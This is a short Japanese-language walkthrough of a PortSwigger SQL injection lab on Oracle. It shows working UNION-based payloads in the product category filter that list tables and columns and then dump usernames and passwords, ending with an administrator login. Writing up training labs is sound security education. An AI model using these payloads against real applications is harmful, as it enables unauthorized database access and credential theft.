# SQL インジェクション攻撃、Oracle 上のデータベースの内容をリストする

次のハッキングラボを実施します  
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle  
このラボには、製品カテゴリ フィルターに SQL インジェクションの脆弱性が含まれています。クエリの結果はアプリケーションの応答で返されるため、UNION 攻撃を使用して他のテーブルからデータを取得できます。

- 1. BurpSuite を起動して Proxy タブからブラウザを起動します
- 2. ハッキングラボにアクセスします
- 3. GET /filter?category=XXXXX を send to repeater します

* 4. リクエストにテーブル一覧を取得する SQL を付加して送信します。
     テーブル一覧が取得できます。

```
GET /filter?category=Lifestyle'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

- 5.テーブル一覧からユーザー情報が格納されているテーブルを見つけてリクエストを送信します

```
GET /filter?category=Lifestyle'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_XLRQBD'-- HTTP/2
```

レスポンスからカラム情報を取得します

```html
<th>PASSWORD_RPORJF</th>
<th>USERNAME_RNIEYR</th>
```

- 6. カラムが取得できたので、ユーザー名とパスワードの一覧を取得するリクエストを送信します

```
GET /filter?category=Lifestyle'+UNION+SELECT+USERNAME_RNIEYR,+PASSWORD_RPORJF+FROM+USERS_XLRQBD-- HTTP/2
```

レスポンス

```html
<th>administrator</th>
<td>3cwkf01h0xcxrt9h5bdh</td>
```

- 7 . 取得した情報を元に管理者でログインします
